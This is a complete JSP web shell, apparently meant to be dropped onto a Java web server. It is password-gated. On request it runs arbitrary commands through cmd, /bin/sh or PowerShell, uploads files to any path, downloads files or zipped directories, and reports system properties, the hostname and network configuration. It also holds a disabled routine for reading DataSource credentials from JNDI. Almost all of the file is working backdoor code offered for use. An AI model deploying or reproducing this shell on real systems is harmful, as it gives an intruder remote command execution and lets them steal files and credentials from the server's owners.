<%@ page import="java.io.*" %>
<%@ page import="java.util.Hashtable" %>
<%@ page import="java.util.Properties" %>
<%@ page import="java.util.StringTokenizer" %>
<%@ page import="java.util.zip.ZipEntry" %>
<%@ page import="java.util.zip.ZipOutputStream" %>
<%@ page import="java.beans.BeanInfo" %>
<%@ page import="java.beans.Introspector" %>
<%@ page import="java.beans.PropertyDescriptor" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.lang.reflect.InvocationTargetException" %>
<%@ page import="java.beans.IntrospectionException" %>
<%@ page import="javax.sql.DataSource" %>
<%@ page import="javax.naming.*" %>

<%!
    private static boolean isNotEmpty(Object obj) {
        if (obj == null) {
            return false;
        }
        return !"".equals(String.valueOf(obj).trim());
    }

    private static String formatMessage(String message) {
        return "[*]\t" + message;
    }

    private  static String exceptionToString(Exception e) {
        StringWriter sw = new StringWriter();
        e.printStackTrace(new PrintWriter(sw, true));
        return sw.toString();
    }

    private static ByteArrayOutputStream inutStreamToOutputStream(InputStream in) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] b = new byte[1024];
        int a = 0;
        while((a = in.read(b))!=-1){
            baos.write(b,0,a);
        }
        return baos;
    }


    private static void extractData(Object jndiObject, JspWriter out) throws Exception  {
        try {
            BeanInfo info = Introspector.getBeanInfo(jndiObject.getClass(), Object.class);
            PropertyDescriptor[] properties = info.getPropertyDescriptors();
            for (int i=0; i < properties.length; i++) {
                String propName = properties[i].getName();
                Method method = properties[i].getReadMethod();
                if (method != null) {
                    if (String.class.equals(method.getReturnType()) && method.getName().startsWith("get")) {
                        try {
                            method.setAccessible(true);
                            out.println(formatMessage(propName+":"+method.invoke(jndiObject, null)));
                        } catch (Exception e) {
                        }
                    }
                }
            }
        } catch (IntrospectionException e) { }
    }

    private static void findJndi(String path, Context ctx, JspWriter out) throws NamingException {
        NamingEnumeration namingEnumeration = ctx.list(path);
        while(namingEnumeration.hasMore()) {
            NameClassPair resource = (NameClassPair) namingEnumeration.next();
            String name = resource.getName();
            String lookPath = path + "/"+name;
            try {
                Object tmp = ctx.lookup(lookPath);
                if (tmp instanceof Context) {
                    findJndi(lookPath, ctx, out);
                } else {
                    if (tmp instanceof DataSource) {
                        try {
                            extractData(tmp, out);
                        } catch (Exception e) {}
                    }
                }
            } catch (NamingException e) {}
        }
    }


    private static String findRealPath(String path) {
        String filePath = null;
        if (isNotEmpty(path)) {
            File f = new File(path).getParentFile();
            //This is a hack needed for tomcat
            while (isNotEmpty(f) && !f.exists())
                f = f.getParentFile();
            if (isNotEmpty(f))
                filePath = f.getAbsolutePath();
        }
        if (filePath == null) {
            filePath = new File(".").getAbsolutePath();
        }
        return filePath;
    }

    private static void zipFile(ZipOutputStream zip, File file, int rootLength) throws IOException{
        if(file.isDirectory() && file.canRead()){
            File[] files = file.listFiles();
            if (files != null) {
                for(int i=0; i < files.length; i++) {
                    zipFile(zip, files[i], rootLength);
                }
            }
        } else {
            FileInputStream in = new FileInputStream(file);
            String separator = File.separator + File.separator;
            zip.putNextEntry(new ZipEntry(file.getAbsolutePath().substring(rootLength).replaceAll(separator, "/")));
            zip.write(inutStreamToOutputStream(in).toByteArray());
            in.close();
        }
    }

    private static void zip(ByteArrayOutputStream out, File file) throws IOException{
        ZipOutputStream zos = new ZipOutputStream(out);
        String parent = file.getParentFile().getAbsolutePath();
        zipFile(zos, file, parent.length()+1);
        zos.close();
    }

    private static class Command {
        private static final String OS_VERSION = "os.version";
        private static final String OS_NAME = "os.name";
        private static final String OS_ARCH = "os.arch";
        private static final String JAVA_HOME = "java.home";
        private static final String JAVA_VENDOR = "java.vendor";
        private static final String JAVA_VERSION = "java.version";
        private static final String USER_DIR = "user.dir";
        private static final String USER_HOME = "user.home";
        private static final String USER_NAME = "user.name";
        private static final String attributes[] = {OS_VERSION, OS_NAME, OS_ARCH, JAVA_HOME,
                JAVA_VENDOR, JAVA_VERSION, USER_DIR,  USER_HOME, USER_NAME};

        private static final String WIN_CMD[] = {"cmd", "/C"};
        private static final String WIN_POWER[] = {"cmd", "/C", "powershell", "-nologo", "-Command"};
        private static final String BASH[]    = {"/bin/sh", "-c"};
        private static final String IPCONFIG = "ipconfig /all";
        private static final String IFCONFIG = "/sbin/ifconfig -a";
        private static final String WDIR_LIST = "dir";
        private static final String LDIR_LIST = "ls -la";

        private static String getOS() {
            return System.getProperty(OS_NAME).toLowerCase();
        }

        private static String ipconfig() {
            String command = (getOS().startsWith("windows")) ? IPCONFIG : IFCONFIG;
            return runCommand(command);
        }

        private static String runCommand(String command) {
            String os = System.getProperty(OS_NAME).toLowerCase();

            String shell[] = (os.startsWith("windows")) ? WIN_CMD : BASH;

            return runCommand(shell, command);
        }

        private static String runPowerCommand(String command) {
            String os = System.getProperty(OS_NAME).toLowerCase();

            String shell[] = (os.startsWith("windows")) ? WIN_POWER : BASH;
            String cmd = "\"& { "+command+";echo  \"---end-of-script---\"; }\"";
            return runCommand(shell, cmd);
        }

        private static String listDir(String path) {
            String command = (getOS().startsWith("windows")) ? WDIR_LIST : LDIR_LIST;
            command += " " + path;
            return runCommand(command);
        }

        private static String runCommand(String shell[], String command) {
            String cmd[] = new String[shell.length + 1];
            System.arraycopy(shell, 0, cmd, 0, shell.length);
            cmd[cmd.length - 1] = command;

            BufferedReader bufferedReader = null;
            InputStreamReader inputStreamReader = null;
            StringBuffer stringBuffer = null;

            try {
                Process process   = Runtime.getRuntime().exec(cmd);
                inputStreamReader = new InputStreamReader(process.getInputStream());
                bufferedReader    = new BufferedReader(inputStreamReader);
                stringBuffer      = new StringBuffer();
                String line;

                while ((line = bufferedReader.readLine()) != null && !line.equals("---end-of-script---")) {
                    if (line.length() > 0) {
                        stringBuffer.append(line);
                        stringBuffer.append('\n');
                    }
                }
            } catch (IOException ex) {
                return "";
            } finally {

                try {
                    if (inputStreamReader != null){
                        inputStreamReader.close();
                    }
                    if (bufferedReader != null){
                        bufferedReader.close();
                    }
                } catch (Exception e) {
                    return "";
                }
            }
            return stringBuffer.toString();
        }
    }

    public class Upload {
        private final int ONE_MB= 1024 * 1024;


        private Hashtable parseData(ServletInputStream data,
                                   String boundary,
                                   String saveInDir)
                throws IllegalArgumentException, IOException
        {
            return processData(data, boundary, saveInDir);
        }

        public Hashtable parseData(ServletInputStream data,
                                   String boundary)
                throws IllegalArgumentException, IOException
        {
            return processData(data, boundary, null);
        }


        private Hashtable processData(ServletInputStream is,
                                      String boundary,
                                      String saveInDir)
                throws IllegalArgumentException, IOException
        {
            if (is == null)
                throw new IllegalArgumentException("InputStream");

            if (boundary == null || boundary.trim().length() < 1)
                throw new IllegalArgumentException("boundary");

            boundary = "--" + boundary;
            StringTokenizer stLine, stFields;
            FileInfo fileInfo;
            Hashtable dataTable = new Hashtable(5);
            String line, field, paramName;
            boolean saveFiles=(saveInDir != null && saveInDir.trim().length() > 0);
            boolean isFile;

            if (saveFiles)
            {
                File f = new File(saveInDir);
                f.mkdirs();
            }
            line = getLine(is);
            if (line == null || !line.startsWith(boundary))
                throw new IOException("Boundary not found;"
                        +" boundary = " + boundary
                        +", line = "    + line);

            while (line != null)
            {
                if (line == null || !line.startsWith(boundary))
                    return dataTable;


                line = getLine(is);
                if (line == null)
                    return dataTable;

                stLine = new StringTokenizer(line, ";\r\n");
                if (stLine.countTokens() < 2)
                    throw new IllegalArgumentException("Bad data in second line");

                line = stLine.nextToken().toLowerCase();
                if (line.indexOf("form-data") < 0)
                    throw new IllegalArgumentException("Bad data in second line");

                stFields = new StringTokenizer(stLine.nextToken(), "=\"");
                if (stFields.countTokens() < 2)
                    throw new IllegalArgumentException("Bad data in second line");

                fileInfo = new FileInfo();
                stFields.nextToken();
                paramName = stFields.nextToken();

                isFile = false;
                if (stLine.hasMoreTokens())
                {
                    field    = stLine.nextToken();
                    stFields = new StringTokenizer(field, "=\"");
                    if (stFields.countTokens() > 1)
                    {
                        if (stFields.nextToken().trim().equalsIgnoreCase("filename"))
                        {
                            fileInfo.setName(paramName);
                            String value = stFields.nextToken();
                            if (value != null && value.trim().length() > 0)
                            {
                                fileInfo.setClientFileName(value);
                                isFile = true;
                            }
                            else
                            {
                                line = skipLines(4, is);
                                continue;
                            }
                        }
                    }
                    else
                    if (field.toLowerCase().indexOf("filename") >= 0)
                    {
                        line = skipLines(4, is);
                        continue;
                    }
                }

                boolean skipBlankLine = true;
                if (isFile)
                {
                    line = getLine(is);
                    if (line == null)
                        return dataTable;

                    if (line.trim().length() < 1)
                        skipBlankLine = false;
                    else
                    {
                        stLine = new StringTokenizer(line, ": ");
                        if (stLine.countTokens() < 2)
                            throw new IllegalArgumentException("Bad data in third line");

                        stLine.nextToken(); // Content-Type
                        fileInfo.setFileContentType(stLine.nextToken());
                    }
                }

                if (skipBlankLine)
                {
                    line = getLine(is);
                    if (line == null)
                        return dataTable;
                }


                if (!isFile)
                {
                    line = getLine(is);
                    if (line == null)
                        return dataTable;

                    dataTable.put(paramName, line);
                    line = getLine(is);

                    continue;
                }

                try
                {
                    OutputStream os = null;
                    String path     = null;
                    if (saveFiles)
                        os = new FileOutputStream(path = getFileName(saveInDir,
                                fileInfo.getClientFileName()));
                    else
                        os = new ByteArrayOutputStream(ONE_MB);


                    boolean readingContent = true;
                    byte b[] = new byte[2 * ONE_MB], b2[] = null;
                    int read;

                    while (readingContent)
                    {
                        if ((read = is.readLine(b, 0, b.length)) == -1)
                        {
                            line = null;
                            break;
                        }

                        if (read < 3) // < 3 means CR and LF or just LF
                        {
                            b2 = new byte[read];
                            System.arraycopy(b, 0, b2, 0, b2.length);
                            if ((read = is.readLine(b, 0, b.length)) == -1)
                            {
                                line = null;
                                break;
                            }
                        }

                        if (compareBoundary(boundary, b))
                        {
                            line = new String(b, 0, read);
                            break;
                        }
                        else
                        if (b2 != null) // Prev line was not a boundary line
                        {
                            os.write(b2);
                            b2 = null;
                        }

                        os.write(b, 0, read);
                        os.flush();
                    }

                    os.close();
                    b  = null;

                    if (!saveFiles)
                    {
                        ByteArrayOutputStream baos = (ByteArrayOutputStream)os;
                        fileInfo.setFileContents(baos.toByteArray());
                    }
                    else
                    {
                        fileInfo.setFile(new File(path));
                        os = null;
                    }

                    dataTable.put(paramName, fileInfo);
                } catch (IOException e) { throw e; }
            }

            return dataTable;
        }

        // Compares boundary string to byte array
        private boolean compareBoundary(String boundary, byte ba[])
        {
            if (boundary == null || ba == null)
                return false;

            for (int i=0; i < boundary.length(); i++)
                if ((byte)boundary.charAt(i) != ba[i])
                    return false;

            return true;
        }

        private synchronized String getLine(ServletInputStream sis)
                throws IOException
        {
            byte   b[]  = new byte[1024];
            int    read = sis.readLine(b, 0, b.length), index;
            String line = null;

            if (read != -1)
            {
                line = new String(b, 0, read);

                if ((index = line.indexOf('\n')) >= 0)
                    line   = line.substring(0, index-1);
            }

            b = null;
            return line;
        }

        private String getFileName(String dir, String fileName)
                throws IllegalArgumentException
        {
            String path = null;

            if (dir == null || fileName == null)
                throw new IllegalArgumentException("dir or fileName is null");

            int   index = fileName.lastIndexOf('/');
            String name = null;
            if (index >= 0)
                name = fileName.substring(index + 1);
            else
                name = fileName;

            index = name.lastIndexOf('\\');
            if (index >= 0)
                fileName = name.substring(index + 1);

            path = dir + File.separator + fileName;
            if (File.separatorChar == '/')
                return path.replace('\\', File.separatorChar);
            else
                return path.replace('/',  File.separatorChar);
        }

        private String skipLines(int numberOfLines, ServletInputStream sis)
                throws IOException
        {
            String line = null;
            for (int i = 0; i < numberOfLines; i++) {
                line = getLine(sis);
            }
            return line;
        }
    }

    public class FileInfo {
        private String name     = null,
                clientFileName  = null,
                fileContentType = null;
        private byte[] fileContents    = null;
        private File   file            = null;
        private StringBuffer sb = new StringBuffer(100);

        public String getName() {
            return name;
        }

        public void setName(String name) {
            this.name = name;
        }

        public String getClientFileName() {
            return clientFileName;
        }

        public void setClientFileName(String clientFileName) {
            this.clientFileName = clientFileName;
        }

        public String getFileContentType() {
            return fileContentType;
        }

        public void setFileContentType(String fileContentType) {
            this.fileContentType = fileContentType;
        }

        public byte[] getFileContents() {
            return fileContents;
        }

        public void setFileContents(byte[] fileContents) {
            this.fileContents = fileContents;
        }

        public File getFile() {
            return file;
        }

        public void setFile(File file) {
            this.file = file;
        }

        public StringBuffer getSb() {
            return sb;
        }

        public void setSb(StringBuffer sb) {
            this.sb = sb;
        }
    }
%>

<%
    //the objective is to use it in a console so lets get rid of does \n
    out.clearBuffer();
    // actions[0] = cmd -> Windows Command line
    // actions[1] = upload -> Upload files
    // actions[2] = download -> Download files
    // actions[3] = ps -> Windows PowerShell
    String actions[] = {"cmd", "upload", "download", "ps"};
    // Mandatory password, configured in web.xml
    String reqPass = request.getParameter("pass");
    String reqMethod = request.getMethod();
    String reqContentType = request.getContentType();
    // Mandatory path parameter for uploads
    String reqPath = request.getParameter("path");
    // Mandatory action (one of the actions adove)
    String reqAction  = request.getParameter("action");
    // Mandatory args for the chosen action
    String reqArgs  = request.getParameter("args");

    if (isNotEmpty(reqPass) && reqPass.equals(application.getInitParameter("pass"))) {
        String appPath = application.getRealPath(request.getRequestURI());
        String path = isNotEmpty(reqPath) ? reqPath : findRealPath(appPath);

        if (isNotEmpty(reqMethod) && "GET".equalsIgnoreCase(reqMethod)) {
            if (isNotEmpty(reqAction) && reqAction.equals(actions[0]) && isNotEmpty(reqArgs)) {
                out.println(formatMessage(Command.runCommand(reqArgs)));
            } else if (isNotEmpty(reqAction) && reqAction.equals(actions[2])) {
                if(isNotEmpty(reqArgs) && isNotEmpty(path)) {
                    File file = new File(path, reqArgs);
                    String fileName = file.isDirectory() ? file.getName()+".zip":file.getName();
                    response.setHeader("Content-Disposition", "attachment; filename="+fileName);
                    BufferedOutputStream bos = new BufferedOutputStream(response.getOutputStream());
                    if(file.isDirectory() && file.canRead() && file.exists()) {
                        response.setContentType("application/zip");
                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
                        zip(baos, file);
                        bos.write(baos.toByteArray());
                        baos.close();
                    } else if (file.canRead() && file.exists()) {
                        response.setContentType("application/octet-stream");
                        InputStream in = new FileInputStream(file);
                        int len;
                        byte[] buf = new byte[1024];
                        while ((len = in.read(buf)) > 0) {
                            bos.write(buf, 0, len);
                        }
                        in.close();
                    }
                    bos.close();
                    out.clear();
                    out = pageContext.pushBody();
                    return ;
                }

            } else if (isNotEmpty(reqAction) && reqAction.equals(actions[3])) {
                out.println(formatMessage(Command.runPowerCommand(reqArgs)));
            } else {
                out.println(formatMessage("====== Java System properties ======"));
                Properties props = System.getProperties();
                String attributes[] = Command.attributes;
                int attributesSize = attributes.length;
                for (int i=0; i < attributesSize; i++) {
                    String attributeValue = attributes[i];
                    String propValue = props.getProperty(attributeValue);
                    out.println(formatMessage(attributeValue+": "+propValue));
                }
                out.println(formatMessage("====== JNDI info ======"));
                InitialContext ctx = null;
                try {
                    ctx = new InitialContext();
                   // findJndi("java:comp", ctx, out);
                } catch (NamingException e) {}

                out.println(formatMessage("====== Network ======"));
                out.println(formatMessage("Hostname:\t"+Command.runCommand("hostname")));
                out.println(formatMessage(Command.ipconfig()));
            }
        } else if (isNotEmpty(reqMethod) && "POST".equalsIgnoreCase(reqMethod)) {
            if(isNotEmpty(reqContentType) && reqContentType.startsWith("multipart")) {
                String boundary;
                int bStart = 0;
                bStart          = reqContentType.lastIndexOf("oundary=");
                boundary        = reqContentType.substring(bStart + 8);
                Upload fileUpload = new Upload();

                Hashtable hashtable = fileUpload.parseData(request.getInputStream(), boundary, path);
                out.println("File uploaded to: "+ path);
                out.println(Command.listDir(path));
            }
        }
    }
%>
